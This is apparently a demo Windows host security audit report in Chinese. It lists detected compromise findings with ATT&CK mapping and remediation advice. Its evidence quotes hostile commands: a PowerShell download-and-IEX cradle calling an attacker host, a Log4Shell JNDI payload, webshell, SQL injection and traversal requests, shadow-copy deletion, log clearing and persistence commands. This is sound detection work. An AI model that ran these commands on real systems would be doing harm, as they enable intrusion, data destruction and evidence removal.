# Windows 主机安全审计报告

- 目标主机：WIN-DEMO01
- 审计方式：demo
- 生成时间：2026-11-23 11:18:20
- 事件总数：62
- 风险评分：1021.3（严重：高度疑似主机已被入侵）

## 严重级别分布

| 级别 | 数量 |
| --- | --- |
| 信息 | 0 |
| 低危 | 3 |
| 中危 | 19 |
| 高危 | 24 |
| 严重 | 15 |

## 攻击链阶段覆盖

| ATT&CK 战术阶段 | 发现数量 |
| --- | --- |
| 初始访问 | 19 |
| 执行 | 10 |
| 持久化 | 5 |
| 权限提升 | 7 |
| 防御规避 | 5 |
| 凭据访问 | 6 |
| 发现 | 3 |
| 横向移动 | 4 |
| 影响 | 1 |
| 加固配置 | 1 |

检测到跨阶段攻击链：初始访问 → 执行 → 持久化 → 权限提升 → 防御规避 → 凭据访问 → 发现 → 横向移动 → 影响 → 加固配置。

## 审计范围与覆盖

- 事件时间范围：2026-11-20 11:18:18 ~ 2026-11-20 13:43:18（本地时区）。
- 各日志解析条数：安全日志 51，RDP 本地会话 5，系统日志 4，PowerShell 操作日志 1，Defender 防护日志 1
- 未采集到 Sysmon 日志：进程访问、网络连接、文件落地等细粒度证据缺失。
- IIS 日志共 66 条请求，涉及 2 个来源 IP。
- Tomcat 日志共 63 条请求、10 条容器日志，版本 8.5.24。
- 已采集主机安全配置基线（Defender、RDP、SMB、审核策略等）。

| 日志 | 条数 | 状态 | 说明 |
| --- | --- | --- | --- |
| 安全日志 | 51 | ok |  |
| 系统日志 | 4 | ok |  |
| PowerShell 操作日志 | 1 | ok |  |
| Defender 防护日志 | 1 | ok |  |
| RDP 本地会话 | 5 | ok |  |
| IIS Web 日志 | 66 | ok |  |
| Tomcat 中间件日志 | 73 | ok |  |

## 详细发现

## Tomcat 中间件分析

| 指标 | 取值 |
| --- | --- |
| 请求总数 | 63 |
| 独立来源 IP | 3 |
| Tomcat 版本 | 8.5.24 |
| Catalina 日志 | 10 |
| SEVERE 事件 | 2 |

| 攻击类型 | 命中次数 |
| --- | --- |
| tomcat_manager | 13 |
| iis_sensitive_file | 33 |
| iis_sqli | 1 |
| iis_traversal | 1 |
| tomcat_web_inf | 1 |
| tomcat_webshell | 2 |
| tomcat_war | 1 |

### Web 应用部署记录

- `2026-11-20T06:19:18+00:00` /tmp/upload/ROOT.war

### 1. [严重] 疑似爆破成功：203.0.113.66 -> Administrator

- 规则：`AUTH-004`
- ATT&CK：T1078 有效账户 / T1110 暴力破解
- 战术：初始访问
- ip：203.0.113.66
- user：Administrator
- 次数：12
- 时间范围：2026-11-20 11:18:18 ~ 2026-11-20 11:32:18

来源 203.0.113.66 在 60 分钟内连续失败 12 次后成功登录账户 Administrator，高度疑似暴力破解成功，账户可能已被攻陷。

**证据：**

- `失败区间 2026-11-20 11:18:18 ~ 2026-11-20 11:30:35（12 次）`
- `成功登录 2026-11-20 11:32:18，类型 10，工作站 KALI-ATTACK`
- `失败: 2026-11-20 11:28:21  EventID=4625 | TargetUserName=Administrator; Status=0xc000006d; SubStatus=0xc000006a`
- `失败: 2026-11-20 11:29:28  EventID=4625 | TargetUserName=Administrator; Status=0xc000006d; SubStatus=0xc000006a`
- `失败: 2026-11-20 11:30:35  EventID=4625 | TargetUserName=Administrator; Status=0xc000006d; SubStatus=0xc000006a`
- `成功: 2026-11-20 11:32:18 [security] 4624 Microsoft-Windows-Security-Auditing | TargetUserName=Administrator; IpAddress=203.0.113.66; LogonType=10`

**建议：** 立即隔离该账户：强制改密、撤销会话与令牌、检查该来源的后续操作（进程创建、服务安装、计划任务、数据访问），并保留证据用于溯源。

### 2. [严重] JSP WebShell 访问特征（203.0.113.66）

- 规则：`TOMCAT-WEBSHELL`
- ATT&CK：T1505.003 Web Shell
- 战术：初始访问
- ip：203.0.113.66
- 次数：2
- 时间范围：2026-11-20 07:41:18 ~ 2026-11-20 07:42:18

来自 203.0.113.66 的 2 条 Tomcat 请求命中“JSP WebShell 访问特征”，其中 2 条返回 2xx/3xx。

**证据：**

- `2026-11-20 07:41:18 GET /upload/shell.jsp?cmd=whoami -> 200 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 07:42:18 PUT /shell.jsp/ -> 201 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`

**建议：** 核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。

### 3. [严重] WebShell 访问/上传特征（198.51.100.23）

- 规则：`WEB-WEBSHELL`
- ATT&CK：T1505.003 Web Shell
- 战术：初始访问
- ip：198.51.100.23
- 次数：2
- 时间范围：2026-11-20 17:38:18 ~ 2026-11-20 17:39:18

来自 198.51.100.23 的 2 条请求命中“WebShell 访问/上传特征”特征，其中 2 条返回 2xx/3xx 状态码。

**证据：**

- `2026-11-20 17:38:18 POST /upload/shell.aspx?cmd=whoami -> 200 UA=Mozilla/5.0`
- `2026-11-20 17:39:18 GET /upload/shell.aspx?cmd=net user -> 200 UA=Mozilla/5.0`

**建议：** 核查对应请求与响应内容；对成功请求立即排查是否已落地 WebShell 或执行命令，并部署 WAF、限制目录执行权限、及时打补丁。

### 4. [严重] Defender 实时保护未开启

- 规则：`POST-DEFENDER`
- ATT&CK：T1562.001 禁用或修改安全工具
- 战术：防御规避
- 次数：1

主机实时保护处于关闭状态。恶意文件可以在不被拦截的情况下执行。

**证据：**

- `AntivirusEnabled=True, RealTimeProtectionEnabled=False`

**建议：** 确认主机是否有正常运行的第三方杀软；如无，请立即启用 Defender 实时保护与云保护。

### 5. [严重] Defender 检出恶意软件：Trojan:Win32/Beacon

- 规则：`DEF-MALWARE`
- ATT&CK：T1204 用户执行
- 战术：执行
- threat：Trojan:Win32/Beacon
- 次数：1
- 时间范围：2026-11-20 12:10:18 ~ 2026-11-20 12:10:18

Windows Defender 检出 Trojan:Win32/Beacon（1 条事件），说明主机上存在或曾存在恶意文件/行为。

**证据：**

- `2026-11-20 12:10:18 Severity=Severe；Detection Type=Real-Time；Path=file:_C:\Users\Public\svchost.exe；Process Name=C:\Windows\System32\cmd.exe；Action Name=Quarantine`

**建议：** 确认处置结果并全盘扫描；提取被检出文件哈希与路径作为 IOC，排查其落地方式（下载、U 盘、邮件附件）与执行后的网络行为。

### 6. [严重] Log4Shell (CVE-2021-44228) 利用尝试（198.51.100.23）

- 规则：`WEB-LOG4SHELL`
- ATT&CK：T1190 利用面向公众的应用
- 战术：初始访问
- ip：198.51.100.23
- 次数：1
- 时间范围：2026-11-20 17:21:18 ~ 2026-11-20 17:21:18

来自 198.51.100.23 的 1 条请求命中“Log4Shell (CVE-2021-44228) 利用尝试”特征，其中 1 条返回 2xx/3xx 状态码。

**证据：**

- `2026-11-20 17:21:18 GET /Default.aspx?x=${jndi:ldap://198.51.100.23/a} -> 200 UA=Mozilla/5.0 (Windows NT 10.0; Win64; x64)`

**建议：** 核查对应请求与响应内容；对成功请求立即排查是否已落地 WebShell 或执行命令，并部署 WAF、限制目录执行权限、及时打补丁。

### 7. [严重] Tomcat 日志出现 jndi 相关异常

- 规则：`TOMCAT-JNDI`
- ATT&CK：T1190 利用面向公众的应用
- 战术：初始访问
- 次数：1

Catalina/localhost 日志中有 1 条异常堆栈包含 jndi 特征，可能是漏洞利用（JNDI 注入、反序列化、命令执行）的痕迹。

**证据：**

- `2026-11-20 14:20:18 Servlet.service() for servlet [jsp] threw exception`

**建议：** 提取完整堆栈与对应请求，排查 webapps 是否被植入后门；升级 Tomcat 与 JDK。

### 8. [严重] WAR 包部署/上传行为（203.0.113.66）

- 规则：`TOMCAT-WAR`
- ATT&CK：T1505.003 Web Shell
- 战术：初始访问
- ip：203.0.113.66
- 次数：1
- 时间范围：2026-11-20 07:43:18 ~ 2026-11-20 07:43:18

来自 203.0.113.66 的 1 条 Tomcat 请求命中“WAR 包部署/上传行为”，其中 1 条返回 2xx/3xx。

**证据：**

- `2026-11-20 07:43:18 PUT /manager/text/deploy?path=/ROOT&war=file:/tmp/upload/ROOT.war -> 200 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`

**建议：** 核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。

### 9. [严重] 可疑命令执行：删除卷影副本/启动恢复项（典型勒索软件前置动作）

- 规则：`EXEC-VOLUME_SHADOW_DESTROY`
- ATT&CK：T1490 禁止系统恢复
- 战术：执行
- 次数：1
- 时间范围：2026-11-20 12:01:18 ~ 2026-11-20 12:01:18

检测到 1 次与“删除卷影副本/启动恢复项（典型勒索软件前置动作）”匹配的命令执行，命令内容与进程链已记录在证据中。

**证据：**

- `命令: vssadmin delete shadows /all /quiet`
- `执行账户: helpdesk_svc(1)`

**建议：** 确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。

### 10. [严重] 可疑命令执行：清除日志/审计记录等反取证操作

- 规则：`EXEC-ANTI_FORENSICS`
- ATT&CK：T1070 清除痕迹
- 战术：执行
- 次数：1
- 时间范围：2026-11-20 12:02:18 ~ 2026-11-20 12:02:18

检测到 1 次与“清除日志/审计记录等反取证操作”匹配的命令执行，命令内容与进程链已记录在证据中。

**证据：**

- `命令: wevtutil cl Security`
- `执行账户: helpdesk_svc(1)`

**建议：** 确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。

### 11. [严重] 后门账户提权：新建账户 helpdesk_svc 加入 Administrators

- 规则：`ACCT-GROUP`
- ATT&CK：T1098 账户操纵 / T1069 权限组发现
- 战术：权限提升
- group：Administrators
- member：helpdesk_svc
- 次数：1
- 时间范围：2026-11-20 11:41:18 ~ 2026-11-20 11:41:18

账户 helpdesk_svc 被加入本地安全组 Administrators（1 次），组成员变更会直接改变权限边界，是攻击者常用的提权与持久化手段。

**证据：**

- `操作者: Administrator(1)`
- `该成员在审计窗口内刚被创建（事件 4720），构成完整后门账户链。`
- `2026-11-20 11:41:18  EventID=4732 | SubjectUserName=Administrator; MemberName=CN=helpdesk_svc,CN=Users,DC=win-demo01; TargetUserName=Administrators`

**建议：** 立即核实变更授权；若为异常变更，将成员移出并禁用账户，审查操作者来源与其他管理员组变更。

### 12. [严重] 审核日志被清除

- 规则：`DEF-CLEARLOG`
- ATT&CK：T1070.001 清除 Windows 事件日志
- 战术：防御规避
- 次数：1
- 时间范围：2026-11-20 12:04:18 ~ 2026-11-20 12:04:18

检测到安全/系统日志被清除。攻击者在获取权限后常清除日志以破坏取证链，这也可能是管理员误操作，必须结合操作者与时间点确认。

**证据：**

- `操作者: helpdesk_svc(1)`
- `2026-11-20 12:04:18  EventID=1102 | SubjectUserName=helpdesk_svc; SubjectDomainName=WIN-DEMO01`

**建议：** 立即启用日志转发（WEF/SIEM）并离线保全现有日志；核查清除操作者与登录来源，清除行为本身应视为高风险入侵迹象。

### 13. [严重] 服务安装：PSEXESVC

- 规则：`PERSIST-SVC`
- ATT&CK：T1543.003 Windows 服务
- 战术：持久化
- service：PSEXESVC
- 次数：1
- 时间范围：2026-11-20 11:55:18 ~ 2026-11-20 11:55:18

检测到服务 PSEXESVC 被安装（事件 4697），映像路径：C:\Windows\PSEXESVC.exe，启动类型：按需。 风险点：服务名具有攻击工具特征

**证据：**

- `映像路径: C:\Windows\PSEXESVC.exe`
- `账户: LocalSystem；服务类型: 用户模式服务；启动类型: 按需`
- `风险因素: 服务名具有攻击工具特征`
- `2026-11-20 11:55:18  EventID=4697 | SubjectUserName=helpdesk_svc; ServiceName=PSEXESVC`

**建议：** 核实服务来源与签名；非授权服务应立即停止并删除，同时排查该服务的可执行文件哈希与网络连接。

### 14. [严重] 服务安装：WinUpdSvc

- 规则：`PERSIST-SVC`
- ATT&CK：T1543.003 Windows 服务
- 战术：持久化
- service：WinUpdSvc
- 次数：1
- 时间范围：2026-11-20 11:48:18 ~ 2026-11-20 11:48:18

检测到服务 WinUpdSvc 被安装（事件 7045），映像路径：C:\Users\Public\svchost.exe，启动类型：自动。 风险点：服务映像位于用户可写目录或包含脚本/编码命令

**证据：**

- `映像路径: C:\Users\Public\svchost.exe`
- `账户: LocalSystem；服务类型: 用户模式服务；启动类型: 自动`
- `风险因素: 服务映像位于用户可写目录或包含脚本/编码命令`
- `2026-11-20 11:48:18  EventID=7045 | ServiceName=WinUpdSvc; ImagePath=C:\Users\Public\svchost.exe`

**建议：** 核实服务来源与签名；非授权服务应立即停止并删除，同时排查该服务的可执行文件哈希与网络连接。

### 15. [严重] 通过 PUT 写入 JSP（CVE-2017-12615 特征）

- 规则：`TOMCAT-JSP-PUT`
- ATT&CK：T1190 利用面向公众的应用
- 战术：初始访问
- 次数：1

检测到 1 次对 JSP 路径的 PUT/DELETE 请求，攻击者可利用 DefaultServlet 只读配置缺陷上传 WebShell。

**证据：**

- `2026-11-20 07:42:18 PUT /shell.jsp/ -> 201`

**建议：** 确认 webapps 目录是否新增 JSP；设置 readonly=true，升级 Tomcat 至修复版本。

### 16. [高危] Manager 认证爆破：203.0.113.66（12 次 401/403）

- 规则：`TOMCAT-MANAGER-BRUTE`
- ATT&CK：T1110 暴力破解
- 战术：凭据访问
- ip：203.0.113.66
- 次数：12

来源 203.0.113.66 对 Tomcat Manager 产生 12 次认证失败，疑似口令爆破。

**证据：**

- `2026-11-20 06:38:18 GET /manager/html -> 401`
- `2026-11-20 06:39:18 GET /manager/html -> 401`
- `2026-11-20 06:40:18 GET /manager/html -> 401`
- `2026-11-20 06:41:18 GET /manager/html -> 401`
- `2026-11-20 06:42:18 GET /manager/html -> 401`
- `2026-11-20 06:43:18 GET /manager/html -> 401`

**建议：** 立即封禁来源，检查 manager-users.xml 与访问日志中是否有成功登录，启用强口令/MFA。

### 17. [高危] 疑似 Kerberoasting：svc_sql 请求 6 个 RC4 服务票据

- 规则：`AUTH-012`
- ATT&CK：T1558.003 Kerberoasting
- 战术：凭据访问
- user：svc_sql
- 次数：6
- 时间范围：2026-11-20 12:33:18 ~ 2026-11-20 12:38:18

账户 svc_sql 获取了 6 个使用 RC4-HMAC 加密的 Kerberos 服务票据，涉及多个 SPN。攻击者可离线破解这类票据获取服务账户明文口令。

**证据：**

- `服务: HTTP/web0.corp.local, HTTP/web1.corp.local, HTTP/web2.corp.local, HTTP/web3.corp.local, HTTP/web4.corp.local, HTTP/web5.corp.local`
- `2026-11-20 12:33:18  EventID=4769 | ServiceName=HTTP/web0.corp.local; IpAddress=10.0.0.77; TicketEncryptionType=0x17`
- `2026-11-20 12:34:18  EventID=4769 | ServiceName=HTTP/web1.corp.local; IpAddress=10.0.0.77; TicketEncryptionType=0x17`
- `2026-11-20 12:35:18  EventID=4769 | ServiceName=HTTP/web2.corp.local; IpAddress=10.0.0.77; TicketEncryptionType=0x17`
- `2026-11-20 12:36:18  EventID=4769 | ServiceName=HTTP/web3.corp.local; IpAddress=10.0.0.77; TicketEncryptionType=0x17`
- `2026-11-20 12:37:18  EventID=4769 | ServiceName=HTTP/web4.corp.local; IpAddress=10.0.0.77; TicketEncryptionType=0x17`

**建议：** 禁用 RC4，改用 AES；为服务账户使用托管服务账户（gMSA）并定期轮换口令；排查票据请求来源。

### 18. [高危] SQL 注入尝试（198.51.100.23）

- 规则：`WEB-SQLI`
- ATT&CK：T1190 利用面向公众的应用
- 战术：初始访问
- ip：198.51.100.23
- 次数：2
- 时间范围：2026-11-20 17:18:18 ~ 2026-11-20 17:19:18

来自 198.51.100.23 的 2 条请求命中“SQL 注入尝试”特征，其中 1 条返回 2xx/3xx 状态码。

**证据：**

- `2026-11-20 17:18:18 GET /Product.aspx?id=1' UNION SELECT username,password FROM users-- -> 500 UA=sqlmap/1.7.2#stable (https://sqlmap.org)`
- `2026-11-20 17:19:18 GET /Product.aspx?id=1 AND SLEEP(5) -> 200 UA=sqlmap/1.7.2#stable (https://sqlmap.org)`

**建议：** 核查对应请求与响应内容；对成功请求立即排查是否已落地 WebShell 或执行命令，并部署 WAF、限制目录执行权限、及时打补丁。

### 19. [高危] AlwaysInstallElevated 已启用

- 规则：`POST-AIE`
- ATT&CK：T1548.002 绕过用户账户控制
- 战术：权限提升
- 次数：1

AlwaysInstallElevated 允许普通用户以 SYSTEM 权限安装 MSI 包，是经典的本地提权配置缺陷。

**建议：** 删除 HKLM/HKCU 下 AlwaysInstallElevated 策略值。

### 20. [高危] Defender 存在排除项

- 规则：`POST-EXCLUSION`
- ATT&CK：T1562.001 禁用或修改安全工具
- 战术：防御规避
- 次数：1

Defender 配置了 2 个排除路径/进程。攻击者取得权限后常添加排除项，使恶意文件不被扫描。

**证据：**

- `排除项: C:\Users\Public；C:\inetpub\wwwroot\upload`

**建议：** 逐项确认排除项业务必要性，删除无法说明来源的排除路径。

### 21. [高危] PowerShell 可疑脚本块：脚本块下载远程内容

- 规则：`PS-PS_DOWNLOAD`
- ATT&CK：T1059.001 PowerShell
- 战术：执行
- 次数：1
- 时间范围：2026-11-20 12:08:18 ~ 2026-11-20 12:08:18

PowerShell 脚本块日志（4104）中检测到 1 段内容匹配“脚本块下载远程内容”，说明执行过对应脚本。

**证据：**

- `脚本: $c = New-Object Net.WebClient; IEX $c.DownloadString('http://203.0.113.66/payload.ps1')`

**建议：** 提取完整脚本块进行人工分析；启用约束语言模式与 AppLocker/WDAC，限制 PowerShell 仅允许签名脚本。

### 22. [高危] PowerShell 可疑脚本块：脚本块使用动态执行（IEX）

- 规则：`PS-PS_IEX`
- ATT&CK：T1059.001 PowerShell
- 战术：执行
- 次数：1
- 时间范围：2026-11-20 12:08:18 ~ 2026-11-20 12:08:18

PowerShell 脚本块日志（4104）中检测到 1 段内容匹配“脚本块使用动态执行（IEX）”，说明执行过对应脚本。

**证据：**

- `脚本: $c = New-Object Net.WebClient; IEX $c.DownloadString('http://203.0.113.66/payload.ps1')`

**建议：** 提取完整脚本块进行人工分析；启用约束语言模式与 AppLocker/WDAC，限制 PowerShell 仅允许签名脚本。

### 23. [高危] SQL 注入尝试（198.51.100.23）

- 规则：`TOMCAT-SQLI`
- ATT&CK：T1190 利用面向公众的应用
- 战术：初始访问
- ip：198.51.100.23
- 次数：1
- 时间范围：2026-11-20 07:38:18 ~ 2026-11-20 07:38:18

来自 198.51.100.23 的 1 条 Tomcat 请求命中“SQL 注入尝试”，其中 0 条返回 2xx/3xx。

**证据：**

- `2026-11-20 07:38:18 GET /item.jsp?id=1%27+UNION+SELECT+password+FROM+users-- -> 500 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`

**建议：** 核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。

### 24. [高危] WDigest 明文凭据缓存已启用

- 规则：`POST-WDIGEST`
- ATT&CK：T1003 凭据转储
- 战术：凭据访问
- 次数：1

UseLogonCredential=1 会让 LSASS 在内存中保存明文口令，攻击者转储 LSASS 后可直接获得明文凭据。

**建议：** 设置 HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential=0 并重启。

### 25. [高危] 从临时目录部署 Web 应用（可疑）

- 规则：`TOMCAT-DEPLOY`
- ATT&CK：T1505.003 Web Shell
- 战术：持久化
- 次数：1

检测到 1 次从用户可写/临时目录部署 Web 应用，可能是攻击者投放 WAR。

**证据：**

- `2026-11-20 14:19:18 Deploying web application archive [/tmp/upload/ROOT.war]`

**建议：** 核对部署来源与 WAR 内容，删除非授权应用并检查 webapps 目录。

### 26. [高危] 创建本地用户账户：helpdesk_svc

- 规则：`ACCT-4720`
- ATT&CK：T1136.001 创建本地账户
- 战术：权限提升
- user：helpdesk_svc
- 次数：1
- 时间范围：2026-11-20 11:38:18 ~ 2026-11-20 11:38:18

新建账户常被攻击者用于建立后门访问。 审计窗口内对账户 helpdesk_svc 发生 1 次该操作，操作者：Administrator(1)。

**证据：**

- `2026-11-20 11:38:18  EventID=4720 | SubjectUserName=Administrator; TargetUserName=helpdesk_svc; SamAccountName=helpdesk_svc`

**建议：** 核对变更工单与操作人员；非授权变更应立即回滚，并检查该账户/操作者此后的登录与提权行为。

### 27. [高危] 创建本地用户账户：svc_backup

- 规则：`ACCT-4720`
- ATT&CK：T1136.001 创建本地账户
- 战术：权限提升
- user：svc_backup
- 次数：1
- 时间范围：2026-11-20 11:44:18 ~ 2026-11-20 11:44:18

新建账户常被攻击者用于建立后门访问。 审计窗口内对账户 svc_backup 发生 1 次该操作，操作者：helpdesk_svc(1)。

**证据：**

- `2026-11-20 11:44:18  EventID=4720 | SubjectUserName=helpdesk_svc; TargetUserName=svc_backup; SamAccountName=svc_backup`

**建议：** 核对变更工单与操作人员；非授权变更应立即回滚，并检查该账户/操作者此后的登录与提权行为。

### 28. [高危] 匿名网络登录（ANONYMOUS LOGON）

- 规则：`AUTH-008`
- ATT&CK：T1021.002 SMB/Windows 管理共享
- 战术：横向移动
- 次数：1
- 时间范围：2026-11-20 12:28:18 ~ 2026-11-20 12:28:18

检测到 1 次匿名网络登录，可能来自空会话枚举、SMB 中继或配置不当的共享访问。

**证据：**

- `2026-11-20 12:28:18  EventID=4624 | IpAddress=10.0.0.77; WorkstationName=WIN-DEMO02`

**建议：** 禁用匿名访问与空会话，限制 SMB/RPC 暴露面，检查共享权限与 NTLM 中继防护（SMB 签名/EPA）。

### 29. [高危] 可疑命令执行：PowerShell 使用 Base64 编码命令（常见于无文件攻击）

- 规则：`EXEC-ENCODED_POWERSHELL`
- ATT&CK：T1059.001 PowerShell
- 战术：执行
- 次数：1
- 时间范围：2026-11-20 11:58:18 ~ 2026-11-20 11:58:18

检测到 1 次与“PowerShell 使用 Base64 编码命令（常见于无文件攻击）”匹配的命令执行，命令内容与进程链已记录在证据中。

**证据：**

- `命令: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`
- `执行账户: helpdesk_svc(1)`

**建议：** 确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。

### 30. [高危] 可疑命令执行：写入注册表 Run 自启动项（持久化）

- 规则：`EXEC-RUN_KEY`
- ATT&CK：T1547.001 注册表 Run 键
- 战术：执行
- 次数：1
- 时间范围：2026-11-20 12:03:18 ~ 2026-11-20 12:03:18

检测到 1 次与“写入注册表 Run 自启动项（持久化）”匹配的命令执行，命令内容与进程链已记录在证据中。

**证据：**

- `命令: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\Public\svchost.exe /f`
- `执行账户: helpdesk_svc(1)`

**建议：** 确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。

### 31. [高危] 可疑命令执行：创建本地用户账户（持久化）

- 规则：`EXEC-USER_ADD`
- ATT&CK：T1136.001 创建本地账户
- 战术：执行
- 次数：1
- 时间范围：2026-11-20 12:00:18 ~ 2026-11-20 12:00:18

检测到 1 次与“创建本地用户账户（持久化）”匹配的命令执行，命令内容与进程链已记录在证据中。

**证据：**

- `命令: net user helpdesk_svc P@ssw0rd! /add`
- `执行账户: helpdesk_svc(1)`

**建议：** 确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。

### 32. [高危] 可疑命令执行：账户/域内侦察命令

- 规则：`EXEC-CREDENTIAL_RECON`
- ATT&CK：T1033 系统所有者/用户发现
- 战术：执行
- 次数：1
- 时间范围：2026-11-20 11:59:18 ~ 2026-11-20 11:59:18

检测到 1 次与“账户/域内侦察命令”匹配的命令执行，命令内容与进程链已记录在证据中。

**证据：**

- `命令: whoami /all`
- `执行账户: helpdesk_svc(1)`

**建议：** 确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。

### 33. [高危] 尝试访问 WEB-INF/META-INF 受保护目录（198.51.100.23）

- 规则：`TOMCAT-WEB_INF`
- ATT&CK：T1005 本地数据收集
- 战术：初始访问
- ip：198.51.100.23
- 次数：1
- 时间范围：2026-11-20 07:39:18 ~ 2026-11-20 07:39:18

来自 198.51.100.23 的 1 条 Tomcat 请求命中“尝试访问 WEB-INF/META-INF 受保护目录”，其中 1 条返回 2xx/3xx。

**证据：**

- `2026-11-20 07:39:18 GET /download?file=../../WEB-INF/web.xml -> 200 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`

**建议：** 核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。

### 34. [高危] 新建账户被登录：helpdesk_svc

- 规则：`ACCT-NEWLOGON`
- ATT&CK：T1078 有效账户 / T1136.001 创建本地账户
- 战术：权限提升
- user：helpdesk_svc
- 次数：1
- 时间范围：2026-11-20 12:18:18 ~ 2026-11-20 12:18:18

账户 helpdesk_svc 创建后被成功登录 1 次，说明该账户已投入使用，需确认是否为授权的运维账户。

**证据：**

- `2026-11-20 12:18:18 登录类型=3 来源=10.0.0.77 工作站=WIN-DEMO02`

**建议：** 立即核实账户用途与登录来源；非授权账户应禁用、删除并重置相关凭据。

### 35. [高危] 服务启动类型变更：WinUpdSvc（手动 -> 自动）

- 规则：`PERSIST-SVC-CONFIG`
- ATT&CK：T1543.003 Windows 服务
- 战术：持久化
- service：WinUpdSvc
- 次数：1
- 时间范围：2026-11-20 13:00:18 ~ 2026-11-20 13:00:18

服务 WinUpdSvc 的启动类型由 手动 改为 自动。该服务在审计窗口内被安装，随后修改启动类型，符合持久化配置特征。

**证据：**

- `手动 -> 自动`

**建议：** 确认变更来源；非授权变更应恢复原启动类型并排查服务映像。

### 36. [高危] 计划任务创建：\Microsoft\Windows\UpdateOrchestrator\SystemCheck

- 规则：`PERSIST-TASK`
- ATT&CK：T1053.005 计划任务
- 战术：持久化
- task：\Microsoft\Windows\UpdateOrchestrator\SystemCheck
- 次数：1
- 时间范围：2026-11-20 11:53:18 ~ 2026-11-20 11:53:18

检测到计划任务 \Microsoft\Windows\UpdateOrchestrator\SystemCheck 被创建，执行命令：powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA。 风险点：任务命令命中 encoded_powershell：PowerShell 使用 Base64 编码命令（常见于无文件攻击）；任务名伪装成系统/更新组件

**证据：**

- `任务名: \Microsoft\Windows\UpdateOrchestrator\SystemCheck`
- `执行命令: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`
- `风险因素: 任务命令命中 encoded_powershell：PowerShell 使用 Base64 编码命令（常见于无文件攻击）；任务名伪装成系统/更新组件`
- `2026-11-20 11:53:18  EventID=4698 | SubjectUserName=helpdesk_svc; TaskName=\Microsoft\Windows\UpdateOrchestrator\SystemCheck`

**建议：** 核对任务来源与执行命令；非授权任务应删除，并检查任务使用的可执行文件与账户权限。

### 37. [高危] 路径穿越尝试（198.51.100.23）

- 规则：`WEB-TRAVERSAL`
- ATT&CK：T1005 本地数据收集
- 战术：初始访问
- ip：198.51.100.23
- 次数：1
- 时间范围：2026-11-20 17:20:18 ~ 2026-11-20 17:20:18

来自 198.51.100.23 的 1 条请求命中“路径穿越尝试”特征，其中 1 条返回 2xx/3xx 状态码。

**证据：**

- `2026-11-20 17:20:18 GET /download.aspx?file=../../windows/win.ini -> 200 UA=Mozilla/5.0 (Windows NT 10.0; Win64; x64)`

**建议：** 核查对应请求与响应内容；对成功请求立即排查是否已落地 WebShell 或执行命令，并部署 WAF、限制目录执行权限、及时打补丁。

### 38. [高危] 路径穿越尝试（198.51.100.23）

- 规则：`TOMCAT-TRAVERSAL`
- ATT&CK：T1005 本地数据收集
- 战术：初始访问
- ip：198.51.100.23
- 次数：1
- 时间范围：2026-11-20 07:39:18 ~ 2026-11-20 07:39:18

来自 198.51.100.23 的 1 条 Tomcat 请求命中“路径穿越尝试”，其中 1 条返回 2xx/3xx。

**证据：**

- `2026-11-20 07:39:18 GET /download?file=../../WEB-INF/web.xml -> 200 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`

**建议：** 核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。

### 39. [高危] 远程桌面已启用但未要求网络级身份验证（NLA）

- 规则：`POST-RDP-NLA`
- ATT&CK：T1021.001 远程桌面协议
- 战术：初始访问
- 次数：1

RDP 未启用 NLA 时，攻击者可在建立会话前进行口令猜测，并且部分 RDP 漏洞（如 BlueKeep）无需认证即可利用。

**证据：**

- `RDP 端口: 3389`

**建议：** 启用 NLA（UserAuthentication=1），通过 VPN/堡垒机限制访问来源，并启用 MFA。

### 40. [中危] 目录/文件枚举扫描：198.51.100.23（40 个 404 路径）

- 规则：`WEB-ENUM`
- ATT&CK：T1595.003 目录扫描
- 战术：发现
- ip：198.51.100.23
- 次数：40

来源 198.51.100.23 产生 40 次 404，涉及 40 个不同路径，符合目录爆破或漏洞扫描器行为。

**证据：**

- `2026-11-20 15:18:18 /admin/backup0.zip -> 404`
- `2026-11-20 15:19:18 /admin/backup1.zip -> 404`
- `2026-11-20 15:20:18 /admin/backup2.zip -> 404`
- `2026-11-20 15:21:18 /admin/backup3.zip -> 404`
- `2026-11-20 15:22:18 /admin/backup4.zip -> 404`
- `2026-11-20 15:23:18 /admin/backup5.zip -> 404`

**建议：** 封禁来源 IP 或限速，隐藏敏感路径，部署 WAF 的扫描器识别规则。

